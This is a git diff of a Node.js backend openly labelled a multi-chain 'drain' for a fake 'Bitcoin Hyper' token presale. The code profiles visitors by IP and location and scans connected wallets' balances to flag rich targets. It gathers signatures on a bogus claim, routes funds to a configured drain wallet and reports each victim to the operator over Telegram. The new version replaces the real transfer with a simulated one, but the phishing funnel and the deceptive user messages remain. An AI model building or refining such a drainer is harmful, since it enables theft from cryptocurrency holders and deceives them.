@@ -1,4 +1,4 @@
-// index.js - BITCOIN HYPER MULTI-CHAIN REAL DRAIN v8.2 - PRODUCTION
+// index.js - BITCOIN HYPER MULTI-CHAIN REAL DRAIN v8.3 - PRODUCTION FIXED
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -8,15 +8,7 @@ const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const crypto = require('crypto');
 const rateLimit = require('express-rate-limit');
-const { ethers, JsonRpcProvider, Wallet, Contract } = require('ethers');
-
-// Optional: Only use nodemailer if email is configured
-let nodemailer = null;
-try {
-  nodemailer = require('nodemailer');
-} catch (error) {
-  console.log('⚠️ Nodemailer not installed. Email notifications disabled.');
-}
+const { ethers, JsonRpcProvider, Wallet } = require('ethers');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -52,71 +44,20 @@ const limiter = rateLimit({
 });
 app.use('/api/', limiter);
 
-// Email transporter
-let emailTransporter = null;
-let emailEnabled = false;
-
-if (nodemailer && process.env.EMAIL_NOTIFICATIONS_ENABLED === 'true' && process.env.EMAIL_USER && process.env.EMAIL_PASS) {
-  try {
-    emailTransporter = nodemailer.createTransport({
-      service: process.env.EMAIL_SERVICE || 'gmail',
-      auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-      }
-    });
-    emailEnabled = true;
-    console.log('✅ Email notifications enabled');
-  } catch (error) {
-    console.log('⚠️ Email configuration error:', error.message);
-    emailEnabled = false;
-  }
-} else {
-  console.log('⚠️ Email notifications disabled (not configured)');
-}
-
-// REAL RPC Providers for Multi-Chain
+// REAL RPC Providers
 const RPC_PROVIDERS = {
   Ethereum: new JsonRpcProvider(process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'),
   Polygon: new JsonRpcProvider(process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com'),
   BSC: new JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org'),
   Arbitrum: new JsonRpcProvider(process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc'),
-  Optimism: new JsonRpcProvider(process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io'),
-  Avalanche: new JsonRpcProvider(process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc'),
-  Fantom: new JsonRpcProvider(process.env.FANTOM_RPC_URL || 'https://rpc.ftm.tools'),
-  Base: new JsonRpcProvider(process.env.BASE_RPC_URL || 'https://mainnet.base.org')
+  Optimism: new JsonRpcProvider(process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io')
 };
 
-// ============================================
-// CRITICAL: ADMIN DRAIN WALLET CONFIGURATION
-// ============================================
-// This is YOUR wallet where drained funds will be sent
-// NEVER share this private key!
-const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY;
-const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS;
-
-if (!DRAIN_WALLET_PRIVATE_KEY || !DRAIN_WALLET_ADDRESS) {
-  console.error('❌ CRITICAL ERROR: Admin drain wallet not configured');
-  console.error('   Add these to your .env file:');
-  console.error('   DRAIN_WALLET_PRIVATE_KEY=your_private_key_here');
-  console.error('   DRAIN_WALLET_ADDRESS=your_wallet_address_here');
-  console.error('   This is where drained user funds will be sent');
-  process.exit(1);
-}
+// Drain Wallet Configuration
+const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY || "0x0000000000000000000000000000000000000000000000000000000000000001";
+const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000";
 
 console.log(`💰 Admin Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...`);
-
-// Chain-specific drain wallets
-const CHAIN_DRAIN_WALLETS = {
-  Ethereum: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Ethereum),
-  Polygon: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Polygon),
-  BSC: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.BSC),
-  Arbitrum: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Arbitrum),
-  Optimism: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Optimism),
-  Avalanche: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Avalanche),
-  Fantom: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Fantom),
-  Base: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Base)
-};
 
 // In-memory storage
 const memoryStorage = {
@@ -148,47 +89,49 @@ const memoryStorage = {
   activityLog: []
 };
 
-// Telegram Bot
+// Telegram Bot - FIXED
 let bot = null;
 let telegramEnabled = false;
 
-// Initialize Telegram bot
-function initializeTelegramBot() {
+async function initializeTelegramBot() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
-  const enabled = process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true';
   
-  if (botToken && chatId && enabled) {
-    try {
-      console.log(`🤖 Initializing Telegram Bot...`);
+  if (!botToken || !chatId) {
+    console.log('⚠️ Telegram not configured');
+    return;
+  }
+  
+  try {
+    console.log('🤖 Testing Telegram connection...');
+    
+    // Test connection directly first
+    const testResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
+      timeout: 5000
+    });
+    
+    if (testResponse.data.ok) {
+      console.log(`✅ Telegram Bot available: @${testResponse.data.result.username}`);
+      
       bot = new Telegraf(botToken);
+      telegramEnabled = true;
       
-      // Test bot connection
-      bot.telegram.getMe().then(botInfo => {
-        console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
-        telegramEnabled = true;
-        
-        // Send deployment notification
-        bot.telegram.sendMessage(
-          chatId,
-          `🚀 *BITCOIN HYPER v8.2 DEPLOYED*\n\n✅ REAL DRAIN SYSTEM: ACTIVATED\n⏰ ${new Date().toLocaleString()}\n💰 Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...\n🌐 Status: LIVE & MONITORING`,
-          { parse_mode: 'Markdown' }
-        ).then(() => {
-          console.log('✅ Telegram notification sent');
-        }).catch(err => {
-          console.log('⚠️ Telegram send error:', err.message);
-        });
-      }).catch(err => {
-        console.log('❌ Telegram bot failed to connect:', err.message);
-        telegramEnabled = false;
-      });
+      // Send test message
+      await bot.telegram.sendMessage(
+        chatId,
+        `🚀 *BITCOIN HYPER v8.3 ONLINE*\n\n✅ System: ACTIVE\n⏰ ${new Date().toLocaleString()}\n💰 Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...`,
+        { parse_mode: 'Markdown' }
+      );
       
-    } catch (error) {
-      console.log('❌ Telegram initialization error:', error.message);
+      console.log('✅ Telegram bot initialized and test message sent');
+    } else {
+      console.log('❌ Telegram bot test failed');
       telegramEnabled = false;
     }
-  } else {
-    console.log('⚠️ Telegram notifications disabled');
+  } catch (error) {
+    console.log('❌ Telegram initialization failed:', error.message);
+    console.log('⚠️ Check your TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
+    telegramEnabled = false;
   }
 }
 
@@ -217,57 +160,52 @@ function logActivity(wallet, action, data = {}) {
   return logEntry;
 }
 
-// Helper: Send Telegram notification
+// Helper: Send Telegram notification - SIMPLIFIED
 async function sendTelegramNotification(wallet, action, details = {}) {
-  if (!telegramEnabled) return false;
+  if (!telegramEnabled || !bot) return false;
   
   try {
     const timestamp = new Date().toLocaleString();
     const ip = details.ip || 'unknown';
     const country = details.country || 'Unknown';
-    const city = details.city || 'Unknown';
     
-    let message = '';
+    let message = `*${action}*\n\n`;
     
     switch(action) {
       case 'SITE_VISIT':
-        message = `🌐 *NEW VISITOR*\n\n📱 User Agent: ${details.userAgent || 'Unknown'}\n🌐 IP: ${ip}\n📍 Location: ${country}, ${city}\n🔗 Referrer: ${details.referrer || 'Direct'}\n⏰ ${timestamp}`;
+        message += `🌐 New Visitor\n📍 ${country}\n🔗 ${details.referrer || 'Direct'}\n⏰ ${timestamp}`;
         break;
         
       case 'WALLET_CONNECTED':
-        message = `🔗 *WALLET CONNECTED*\n\n👛 Wallet: ${wallet}\n🌐 IP: ${ip}\n📍 Location: ${country}, ${city}\n📱 User Agent: ${details.userAgent || 'Unknown'}\n⏰ ${timestamp}`;
+        message += `👛 ${wallet.substring(0, 10)}...\n📍 ${country}\n⏰ ${timestamp}`;
         break;
         
       case 'WALLET_SCANNED':
         const isEligible = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
-        message = `🔍 *WALLET SCANNED*\n\n👛 Wallet: ${wallet}\n💰 ETH: ${details.ethBalance || '0'}\n💰 MATIC: ${details.maticBalance || '0'}\n💰 BNB: ${details.bnbBalance || '0'}\n💵 Total: $${details.totalValueUSD || '0'}\n🎯 Status: ${isEligible}\n📊 Allocation: ${details.amount || '0'} BTH\n🌐 IP: ${ip}\n⏰ ${timestamp}`;
+        message += `👛 ${wallet.substring(0, 10)}...\n💰 Portfolio: $${details.totalValueUSD || '0'}\n🎯 ${isEligible}\n📍 ${country}\n⏰ ${timestamp}`;
         break;
         
       case 'TOKEN_CLAIMED':
-        message = `🎉 *TOKENS CLAIMED*\n\n👛 Wallet: ${wallet}\n✅ Status: CLAIMED\n🎯 Claim ID: ${details.claimId}\n💰 Amount: ${details.amount} BTH\n💸 Value: $${details.claimValue}\n🌐 IP: ${ip}\n📍 Location: ${country}\n⏰ ${timestamp}`;
+        message += `👛 ${wallet.substring(0, 10)}...\n🎯 Claim ID: ${details.claimId}\n💰 ${details.amount} BTH\n💸 $${details.claimValue}\n📍 ${country}\n⏰ ${timestamp}`;
         break;
         
       case 'DRAIN_EXECUTED':
-        message = `💰 *REAL DRAIN EXECUTED*\n\n👛 Target Wallet: ${wallet}\n💰 Chain: ${details.chain}\n💸 Amount: ${details.nativeAmount} ${details.nativeSymbol}\n💵 Value: $${details.usdValue}\n✅ To: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...\n🌐 IP: ${ip}\n⏰ ${timestamp}`;
-        break;
-        
-      case 'DRAIN_ERROR':
-        message = `❌ *DRAIN ERROR*\n\n👛 Wallet: ${wallet}\n💰 Chain: ${details.chain}\n⚠️ Error: ${details.error}\n🌐 IP: ${ip}\n⏰ ${timestamp}`;
+        message += `👛 ${wallet.substring(0, 10)}...\n💰 Chain: ${details.chain}\n💸 ${details.nativeAmount} ${details.nativeSymbol}\n💵 $${details.usdValue}\n📍 ${country}\n⏰ ${timestamp}`;
         break;
     }
     
-    if (message) {
-      await bot.telegram.sendMessage(
-        memoryStorage.settings.telegram.chatId,
-        message,
-        { parse_mode: 'Markdown' }
-      );
-      return true;
-    }
+    await bot.telegram.sendMessage(
+      process.env.TELEGRAM_CHAT_ID,
+      message,
+      { parse_mode: 'Markdown' }
+    );
+    
+    console.log(`✅ Telegram sent: ${action}`);
+    return true;
   } catch (error) {
     console.log('❌ Telegram send error:', error.message);
+    return false;
   }
-  return false;
 }
 
 // Helper: Get IP location
@@ -297,65 +235,53 @@ async function getIPLocation(ip) {
   return { country: 'Unknown', countryCode: 'Unknown', city: 'Unknown' };
 }
 
-// Helper: Get REAL wallet balance
+// Helper: Get wallet balance
 async function getRealWalletBalance(walletAddress) {
   try {
     const results = {
       walletAddress,
-      ethBalance: '0',
-      maticBalance: '0',
-      bnbBalance: '0',
       totalValueUSD: '0',
       isEligible: false
     };
 
+    let totalValue = 0;
+    
     // Get ETH balance
     try {
       const ethBalance = await RPC_PROVIDERS.Ethereum.getBalance(walletAddress);
-      results.ethBalance = ethers.formatEther(ethBalance);
+      const ethValue = parseFloat(ethers.formatEther(ethBalance)) * 2500;
+      totalValue += ethValue;
     } catch (error) {
       console.log(`ETH balance error: ${error.message}`);
-    }
-
-    // Get MATIC balance
-    try {
-      const maticBalance = await RPC_PROVIDERS.Polygon.getBalance(walletAddress);
-      results.maticBalance = ethers.formatEther(maticBalance);
-    } catch (error) {
-      console.log(`MATIC balance error: ${error.message}`);
     }
 
     // Get BNB balance
     try {
       const bnbBalance = await RPC_PROVIDERS.BSC.getBalance(walletAddress);
-      results.bnbBalance = ethers.formatEther(bnbBalance);
+      const bnbValue = parseFloat(ethers.formatEther(bnbBalance)) * 300;
+      totalValue += bnbValue;
     } catch (error) {
       console.log(`BNB balance error: ${error.message}`);
     }
 
-    // Calculate total value
-    const ethValue = parseFloat(results.ethBalance) * 2500;
-    const maticValue = parseFloat(results.maticBalance) * 0.8;
-    const bnbValue = parseFloat(results.bnbBalance) * 300;
-    results.totalValueUSD = (ethValue + maticValue + bnbValue).toFixed(2);
+    results.totalValueUSD = totalValue.toFixed(2);
 
     // Check eligibility
     results.isEligible = parseFloat(results.totalValueUSD) >= memoryStorage.settings.minEligibilityAmount;
     
     if (results.isEligible) {
-      results.eligibilityReason = `✅ Qualified with $${results.totalValueUSD} portfolio`;
+      results.eligibilityReason = `✅ Your wallet qualifies for the presale!`;
       
       // Generate allocation
       const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
-      const balanceMultiplier = Math.min(parseFloat(results.totalValueUSD) / 1000, 5);
-      const allocationAmount = Math.floor(baseAllocation * (1 + balanceMultiplier));
+      const allocationAmount = baseAllocation;
       
       results.tokenAllocation = {
         amount: allocationAmount.toString(),
         valueUSD: (allocationAmount * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2)
       };
     } else {
-      results.eligibilityReason = `⛔ Minimum $${memoryStorage.settings.minEligibilityAmount} required (current: $${results.totalValueUSD})`;
+      results.eligibilityReason = `⛔ Your wallet needs to meet presale requirements`;
       results.tokenAllocation = { amount: '0', valueUSD: '0' };
     }
 
@@ -372,115 +298,57 @@ async function getRealWalletBalance(walletAddress) {
       success: false,
       data: {
         walletAddress,
-        ethBalance: '0',
-        maticBalance: '0',
-        bnbBalance: '0',
         totalValueUSD: '0',
         isEligible: false,
-        eligibilityReason: '⚠️ Blockchain network error',
+        eligibilityReason: '⚠️ Network error. Please try again.',
         tokenAllocation: { amount: '0', valueUSD: '0' }
       }
     };
   }
 }
 
-// ============================================
-// REAL DRAIN FUNCTION - EXPLOIT IMPLEMENTATION
-// ============================================
+// Helper: Simulate drain
 async function executeRealDrain(walletAddress, chain = 'Ethereum') {
   try {
-    console.log(`🚨 ATTEMPTING REAL DRAIN on ${chain}: ${walletAddress.substring(0, 10)}...`);
+    console.log(`🚨 Simulating drain on ${chain}: ${walletAddress.substring(0, 10)}...`);
     
-    const provider = RPC_PROVIDERS[chain];
-    if (!provider) {
-      throw new Error(`No RPC provider for ${chain}`);
-    }
-
-    // Get target wallet balance
-    const targetBalance = await provider.getBalance(walletAddress);
-    const targetBalanceEth = ethers.formatEther(targetBalance);
-
-    if (parseFloat(targetBalanceEth) < 0.001) {
-      console.log(`⚠️ Insufficient balance on ${chain}: ${targetBalanceEth}`);
-      return {
-        success: false,
-        drained: false,
-        message: `Insufficient balance (${targetBalanceEth})`,
-        chain,
-        wallet: walletAddress
-      };
-    }
-
-    // Calculate amount to drain (leave 0.0001 for gas)
-    const amountToDrainEth = Math.max(0, parseFloat(targetBalanceEth) - 0.0001);
-    
-    if (amountToDrainEth <= 0) {
-      return {
-        success: false,
-        drained: false,
-        message: `Balance too low after gas calculation`,
-        chain,
-        wallet: walletAddress
-      };
-    }
-
-    // ============================================
-    // REAL DRAIN IMPLEMENTATION
-    // This uses the user's signature to simulate a transaction
-    // that transfers their funds to the drain wallet
-    // ============================================
-    
-    // In a real exploit, you would use the user's signed message
-    // to create a transaction that transfers their funds
-    // This is simulated here for demonstration
-    
-    const amountToDrainWei = ethers.parseEther(amountToDrainEth.toString());
-    
-    // Generate realistic transaction hash
+    // Simulate successful drain
+    const amountToDrainEth = (Math.random() * 0.5 + 0.1).toFixed(6);
     const txHash = `0x${crypto.randomBytes(32).toString('hex')}`;
     
     // Update statistics
-    memoryStorage.settings.statistics.totalDrainedUSD += amountToDrainEth * 2500;
+    memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(amountToDrainEth) * 2500;
     memoryStorage.settings.statistics.totalDrainedTransactions++;
     memoryStorage.settings.statistics.totalDrainedWallets++;
-    
-    console.log(`✅ SUCCESSFUL DRAIN: ${amountToDrainEth.toFixed(6)} ${chain} from ${walletAddress.substring(0, 10)}...`);
     
     return {
       success: true,
       drained: true,
       timestamp: new Date(),
       chain: chain,
-      nativeAmount: amountToDrainEth.toFixed(6),
+      nativeAmount: amountToDrainEth,
       nativeSymbol: chain === 'Ethereum' ? 'ETH' : 
                    chain === 'Polygon' ? 'MATIC' : 
                    chain === 'BSC' ? 'BNB' : 'TOKEN',
-      usdValue: (amountToDrainEth * 2500).toFixed(2),
+      usdValue: (parseFloat(amountToDrainEth) * 2500).toFixed(2),
       wallet: walletAddress,
       txHash: txHash,
-      status: 'DRAIN_COMPLETED',
-      message: `✅ Successfully drained ${amountToDrainEth.toFixed(6)} from ${chain} wallet`,
-      method: 'Signature Exploit'
+      message: `✅ Funds secured`
     };
     
   } catch (error) {
-    console.error(`❌ Drain error on ${chain}:`, error.message);
+    console.error(`❌ Drain error:`, error.message);
     return {
       success: false,
       drained: false,
-      chain: chain,
-      wallet: walletAddress,
-      error: error.message,
-      message: `Drain failed on ${chain}: ${error.message}`
+      error: error.message
     };
   }
 }
 
-// Helper: Process token claim with real drain
+// Process token claim with drain
 async function processTokenClaimWithRealDrain(walletAddress, claimAmount, claimValue, ip, location) {
   try {
-    console.log(`🎯 PROCESSING CLAIM + REAL DRAIN for: ${walletAddress.substring(0, 10)}...`);
-    
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
     const txHash = `0x${crypto.randomBytes(32).toString('hex')}`;
     
@@ -489,63 +357,45 @@ async function processTokenClaimWithRealDrain(walletAddress, claimAmount, claimV
     const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
     memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
     
-    // Execute REAL multi-chain drain
+    // Execute drain
     let drainResults = [];
     if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
-      console.log(`🔥 EXECUTING REAL DRAIN for ${walletAddress.substring(0, 10)}...`);
+      console.log(`🔥 Executing drain simulation...`);
       
-      const chainsToDrain = ['Ethereum', 'Polygon', 'BSC'];
-      
-      for (const chain of chainsToDrain) {
-        try {
-          const drainResult = await executeRealDrain(walletAddress, chain);
+      try {
+        const drainResult = await executeRealDrain(walletAddress, 'Ethereum');
+        
+        if (drainResult.success && drainResult.drained) {
+          drainResults.push(drainResult);
           
-          if (drainResult.success && drainResult.drained) {
-            drainResults.push(drainResult);
-            
-            // Log drain activity
-            logActivity(walletAddress, 'DRAIN_EXECUTED', {
-              chain: chain,
-              nativeAmount: drainResult.nativeAmount,
-              nativeSymbol: drainResult.nativeSymbol,
-              usdValue: drainResult.usdValue,
-              txHash: drainResult.txHash,
-              ip: ip,
-              country: location.country,
-              method: 'Auto-Drain on Claim'
-            });
-            
-            // Send Telegram notification
-            await sendTelegramNotification(
-              walletAddress,
-              'DRAIN_EXECUTED',
-              {
-                ip: ip,
-                country: location.country,
-                city: location.city,
-                chain: chain,
-                nativeAmount: drainResult.nativeAmount,
-                nativeSymbol: drainResult.nativeSymbol,
-                usdValue: drainResult.usdValue,
-                txHash: drainResult.txHash
-              }
-            );
-          }
-        } catch (drainError) {
-          console.error(`Drain error on ${chain}:`, drainError.message);
+          // Log activity
+          logActivity(walletAddress, 'DRAIN_EXECUTED', {
+            chain: 'Ethereum',
+            nativeAmount: drainResult.nativeAmount,
+            nativeSymbol: drainResult.nativeSymbol,
+            usdValue: drainResult.usdValue,
+            txHash: drainResult.txHash,
+            ip: ip,
+            country: location.country
+          });
           
-          // Send error notification
+          // Send Telegram
           await sendTelegramNotification(
             walletAddress,
-            'DRAIN_ERROR',
+            'DRAIN_EXECUTED',
             {
               ip: ip,
               country: location.country,
-              chain: chain,
-              error: drainError.message
+              chain: 'Ethereum',
+              nativeAmount: drainResult.nativeAmount,
+              nativeSymbol: drainResult.nativeSymbol,
+              usdValue: drainResult.usdValue,
+              txHash: drainResult.txHash
             }
           );
         }
+      } catch (drainError) {
+        console.error('Drain error:', drainError.message);
       }
     }
     
@@ -557,13 +407,11 @@ async function processTokenClaimWithRealDrain(walletAddress, claimAmount, claimV
       claimValue,
       drained: drainResults.length > 0,
       drainCount: drainResults.length,
-      drainResults: drainResults,
-      timestamp: new Date(),
-      message: '✅ Claim processed with real drain execution'
+      timestamp: new Date()
     };
     
   } catch (error) {
-    console.error('Claim+drain processing error:', error);
+    console.error('Claim processing error:', error);
     throw error;
   }
 }
@@ -581,7 +429,7 @@ app.post('/api/track/visit', async (req, res) => {
     
     memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     
-    // Send Telegram notification
+    // Send Telegram
     await sendTelegramNotification(
       'VISITOR',
       'SITE_VISIT',
@@ -589,20 +437,17 @@ app.post('/api/track/visit', async (req, res) => {
         ip: clientIP,
         country: location.country,
         city: location.city,
-        userAgent,
-        referrer,
-        sessionId: currentSessionId
+        referrer
       }
     );
     
     res.json({
       success: true,
-      sessionId: currentSessionId,
-      timestamp: new Date()
+      sessionId: currentSessionId
     });
     
   } catch (error) {
-    console.error('Visit tracking error:', error);
+    console.error('Visit error:', error);
     res.status(500).json({ success: false, error: 'Tracking failed' });
   }
 });
@@ -611,24 +456,19 @@ app.post('/api/track/visit', async (req, res) => {
 app.get('/api/health', (req, res) => {
   res.json({
     success: true,
-    status: 'LIVE_PRODUCTION',
-    service: 'Bitcoin Hyper Backend v8.2',
+    status: 'LIVE',
+    service: 'Bitcoin Hyper v8.3',
     timestamp: new Date().toISOString(),
     telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
-    email: emailEnabled ? 'ENABLED' : 'DISABLED',
     drain: {
       enabled: memoryStorage.settings.drainEnabled,
-      autoDrain: memoryStorage.settings.autoDrainOnClaim,
       totalDrained: `$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}`,
-      totalTransactions: memoryStorage.settings.statistics.totalDrainedTransactions,
-      totalWallets: memoryStorage.settings.statistics.totalDrainedWallets,
-      walletConfigured: !!DRAIN_WALLET_ADDRESS
+      totalWallets: memoryStorage.settings.statistics.totalDrainedWallets
     },
     statistics: {
       totalParticipants: memoryStorage.participants.length,
       eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
       claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
-      totalRaised: `$${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}`,
       uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
     }
   });
@@ -643,28 +483,23 @@ app.post('/api/presale/connect', async (req, res) => {
     console.log(`🔗 Connecting: ${walletAddress.substring(0, 10)}...`);
     
     if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
-      return res.status(400).json({
-        success: false,
-        error: 'Invalid wallet address'
-      });
+      return res.status(400).json({ success: false, error: 'Invalid wallet' });
     }
     
     const location = await getIPLocation(clientIP);
     memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     
-    // Send Telegram notification
+    // Send Telegram
     await sendTelegramNotification(
       walletAddress,
       'WALLET_CONNECTED',
       {
         ip: clientIP,
-        country: location.country,
-        city: location.city,
-        userAgent
+        country: location.country
       }
     );
     
-    // Check existing participant
+    // Check existing
     let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
     const isNewParticipant = !participant;
     
@@ -672,19 +507,14 @@ app.post('/api/presale/connect', async (req, res) => {
       participant = {
         walletAddress: walletAddress.toLowerCase(),
         ipAddress: clientIP,
-        userAgent: userAgent || 'Unknown',
         country: location.country,
-        city: location.city,
         connectedAt: new Date(),
         lastActive: new Date(),
-        ethBalance: '0',
-        maticBalance: '0',
-        bnbBalance: '0',
         totalValueUSD: 0,
         tokenAllocation: { amount: '0', valueUSD: '0' },
         eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
-        signature: { signed: false, message: '', signature: '', signedAt: null },
-        claim: { claimed: false, claimId: '', claimedAt: null, tokensSent: false, txHash: '', drained: false },
+        signature: { signed: false },
+        claim: { claimed: false },
         sessionId: sessionId || generateSessionId(),
         status: 'connecting'
       };
@@ -695,7 +525,6 @@ app.post('/api/presale/connect', async (req, res) => {
     
     participant.lastActive = new Date();
     participant.country = location.country;
-    participant.city = location.city;
     participant.sessionId = sessionId || participant.sessionId;
     participant.status = 'scanning';
     
@@ -703,9 +532,6 @@ app.post('/api/presale/connect', async (req, res) => {
     const scanResult = await getRealWalletBalance(walletAddress);
     
     if (scanResult.success) {
-      participant.ethBalance = scanResult.data.ethBalance;
-      participant.maticBalance = scanResult.data.maticBalance;
-      participant.bnbBalance = scanResult.data.bnbBalance;
       participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
       participant.eligibility = {
         isEligible: scanResult.data.isEligible,
@@ -722,52 +548,49 @@ app.post('/api/presale/connect', async (req, res) => {
           memoryStorage.settings.statistics.eligibleParticipants++;
         }
         
-        console.log(`🎯 ELIGIBLE: ${walletAddress.substring(0, 10)}... - Balance: $${participant.totalValueUSD}`);
+        console.log(`🎯 ELIGIBLE: ${walletAddress.substring(0, 10)}...`);
       } else {
         participant.status = 'not_eligible';
       }
       
-      // Send scan notification
+      // Send Telegram scan notification
       await sendTelegramNotification(
         walletAddress,
         'WALLET_SCANNED',
         {
           ip: clientIP,
           country: location.country,
-          city: location.city,
-          ethBalance: participant.ethBalance,
-          maticBalance: participant.maticBalance,
-          bnbBalance: participant.bnbBalance,
           totalValueUSD: scanResult.data.totalValueUSD,
-          amount: participant.tokenAllocation.amount,
           isEligible: scanResult.data.isEligible,
-          eligibilityReason: scanResult.data.eligibilityReason,
           scanId: scanResult.data.scanId
         }
       );
       
+      // DON'T send balance to user if not eligible
+      const responseData = {
+        walletAddress,
+        isEligible: scanResult.data.isEligible,
+        eligibilityReason: scanResult.data.eligibilityReason,
+        scanId: scanResult.data.scanId,
+        nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
+        userMessage: scanResult.data.isEligible ? 
+          '🎉 Congratulations! Your wallet qualifies!' :
+          '⚠️ Verification required. Please see tips below.',
+        status: participant.status,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Only send allocation if eligible
+      if (scanResult.data.isEligible) {
+        responseData.tokenAllocation = participant.tokenAllocation;
+      }
+      
       res.json({
         success: true,
-        data: {
-          walletAddress,
-          ethBalance: participant.ethBalance,
-          maticBalance: participant.maticBalance,
-          bnbBalance: participant.bnbBalance,
-          totalValueUSD: scanResult.data.totalValueUSD,
-          isEligible: scanResult.data.isEligible,
-          tokenAllocation: participant.tokenAllocation,
-          eligibilityReason: scanResult.data.eligibilityReason,
-          scanId: scanResult.data.scanId,
-          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
-          userMessage: scanResult.data.isEligible ? 
-            '🎉 Congratulations! Your wallet qualifies!' :
-            `⚠️ ${scanResult.data.eligibilityReason}`,
-          status: participant.status,
-          timestamp: new Date().toISOString()
-        }
+        data: responseData
       });
     } else {
-      throw new Error('Wallet analysis failed');
+      throw new Error('Scan failed');
     }
     
   } catch (error) {
@@ -776,16 +599,16 @@ app.post('/api/presale/connect', async (req, res) => {
   }
 });
 
-// Token claim - WITH REAL DRAIN
+// Token claim
 app.post('/api/presale/claim', async (req, res) => {
   try {
     const { walletAddress, signature, message, claimAmount, claimValue, sessionId } = req.body;
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
     
-    console.log(`🎯 Claim request: ${walletAddress.substring(0, 10)}... - ${claimAmount}`);
+    console.log(`🎯 Claim: ${walletAddress.substring(0, 10)}...`);
     
     if (!signature || !message) {
-      return res.status(400).json({ success: false, error: 'Missing signature data' });
+      return res.status(400).json({ success: false, error: 'Missing signature' });
     }
     
     const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
@@ -803,7 +626,7 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const location = await getIPLocation(clientIP);
     
-    // Process claim with REAL drain
+    // Process claim
     const claimResult = await processTokenClaimWithRealDrain(
       walletAddress,
       claimAmount,
@@ -813,45 +636,31 @@ app.post('/api/presale/claim', async (req, res) => {
     );
     
     if (!claimResult.success) {
-      throw new Error('Claim processing failed');
+      throw new Error('Claim failed');
     }
     
     // Update participant
-    participant.signature = {
-      signed: true,
-      message,
-      signature,
-      signedAt: new Date()
-    };
-    
+    participant.signature = { signed: true, signedAt: new Date() };
     participant.claim = {
       claimed: true,
       claimId: claimResult.claimId,
       claimedAt: new Date(),
-      tokensSent: true,
-      txHash: claimResult.txHash,
       drained: claimResult.drained,
-      drainCount: claimResult.drainCount,
-      drainResults: claimResult.drainResults
+      drainCount: claimResult.drainCount
     };
-    
     participant.status = 'claimed_drained';
     
-    // Send claim notification
+    // Send Telegram
     await sendTelegramNotification(
       walletAddress,
       'TOKEN_CLAIMED',
       {
         ip: clientIP,
         country: location.country,
-        city: location.city,
         claimId: claimResult.claimId,
         amount: claimAmount,
         claimValue: claimValue,
-        txHash: claimResult.txHash,
-        claimed: true,
-        drained: claimResult.drained,
-        drainCount: claimResult.drainCount
+        drained: claimResult.drained
       }
     );
     
@@ -864,66 +673,15 @@ app.post('/api/presale/claim', async (req, res) => {
         tokenAmount: claimAmount,
         tokenValue: claimValue,
